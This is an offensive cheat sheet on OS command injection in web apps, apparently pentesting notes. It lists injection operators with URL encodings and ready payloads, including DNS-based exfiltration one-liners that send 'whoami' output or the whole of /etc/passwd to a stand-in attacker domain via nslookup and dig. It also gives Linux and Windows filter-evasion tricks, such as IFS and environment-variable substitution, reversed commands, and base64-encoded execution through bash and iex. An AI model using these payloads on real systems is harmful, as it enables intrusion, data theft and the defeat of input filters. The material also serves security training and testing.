# <a id="top-of-page"></a> OS Command Injection

### Links

- [Exploitation](#exploit)
  - Detection
  - [Injection Operators](#inject)
- [Filter Evasion](#filter)
  - Linux
  - Windows

# <a id="exploit"></a> Exploitation

## -Detection-

The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. The attacker will attempt to append their command through various injection methods. If the command output changes from the intended usual result, that is a successfully exploited vulnerability. This may not be true for more advanced command injection vulnerabilities because it may require various fuzzing methods or code reviews to identify potential command injection vulnerabilities.

### --Types of OS Command Injection---

When looking for OS command injections, it is important to look at functions in an Web App that tend to be performed by OS commands (e.g., ping, nslookup, etc...).

There are two variants of OS command injection:

- Blind: The output of the injected command is not visible
- Non-blind: The app returns the output from injected commands

| **Non-Blind**                                                      | **Blind**                                                                          |
| ------------------------------------------------------------------ | ---------------------------------------------------------------------------------- |
| Read a world-readable file: /etc/passwd or C:\Windows\win.ini      | Ping an attacker controlled system or send DNS query to attacker controlled domain |
| Look for passwords and SSH keys, review the list of installed apps | Determine if common scriptive langs and remote access tools are available          |
| Get a shell on target                                              | Get a shell on target                                                              |

**---Methods for Determining Blind Injections---**

ICMP and DNS are useful tools for ID'ing Blind Injection.

| **Command**                         | **Description**                                     |
| ----------------------------------- | --------------------------------------------------- |
| `example.com; ping -c11 127.0.0.1`  | Pinging localhost 11 times to sleep 10 seconds      |
| `example.com; nslookup example.com` | Use a DNS query to resolve an attacker owned domain |

DNS queries are very useful, less likely to be filtered, and use DNS fowarders (direct Internet access on host not required).

A couple options on how to set up attacker domain:

- Register DNS name (xyz.com) and stand up VPS (cloud likely)
- Use Burp Collaborator

**---Data Exfil via DNS---**

_Data exfil using Hex_

| **Command**                                                      | **Description**           |
| ---------------------------------------------------------------- | ------------------------- |
| `target.com;a=$(whoami\|xxd -ps);nslookup $a.attackerdomain.com` | Exfil OS CMDi through DNS |
| `xxd -rp`                                                        | Decode Hex command        |

_Data exfil using Base32_

| **Command**                                                              | **Description**               |
| ------------------------------------------------------------------------ | ----------------------------- |
| `target.com;a=$(whoami\|base32\|tr -d =);nslookup $a.attackerdomain.com` | Modern POSIX compliant attack |
| `base32 -d`                                                              | Decode base32 command         |

Can potentially get full files (e.g., /etc/passwd) using BASH loop in command.

```
$(cat /etc/passwd | base32 -w 63 | while read L; do dig $L.attackerdomain.com @<nameserver>; done)
```

## <a id="inject"></a> -Injection Operators-

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

[Back to top](#top-of-page)

</br>

# <a id="filter"></a> Filter Evasion

## -Linux-

### --Filtered Character Bypass--

| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |
| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |

---

### --Blacklisted Command Bypass--

| Code                                                         | Description                         |
| ------------------------------------------------------------ | ----------------------------------- |
| **Character Insertion**                                      |
| `'` or `"`                                                   | Total must be even                  |
| `$@` or `\`                                                  | Linux only                          |
| **Case Manipulation**                                        |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
| **Reversed Commands**                                        |
| `echo 'whoami' \| rev`                                       | Reverse a string                    |
| `$(rev<<<'imaohw')`                                          | Execute reversed command            |
| **Encoded Commands**                                         |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |

---

## -Windows-

### --Filtered Character Bypass--

| Code                    | Description                                                  |
| ----------------------- | ------------------------------------------------------------ |
| `Get-ChildItem Env:`    | Can be used to view all environment variables - (PowerShell) |
| **Spaces**              |
| `%09`                   | Using tabs instead of spaces                                 |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD)                        |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell)                 |
| **Other Characters**    |
| `%HOMEPATH:~0,-17%`     | Will be replaced with `\` - (CMD)                            |
| `$env:HOMEPATH[0]`      | Will be replaced with `\` - (PowerShell)                     |

---

### --Blacklisted Command Bypass--

| Code                                                                                                         | Description                              |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| **Character Insertion**                                                                                      |
| `'` or `"`                                                                                                   | Total must be even                       |
| `^`                                                                                                          | Windows only (CMD)                       |
| **Case Manipulation**                                                                                        |
| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
| **Reversed Commands**                                                                                        |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
| **Encoded Commands**                                                                                         |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |

[Back to top](#top-of-page)

</br>
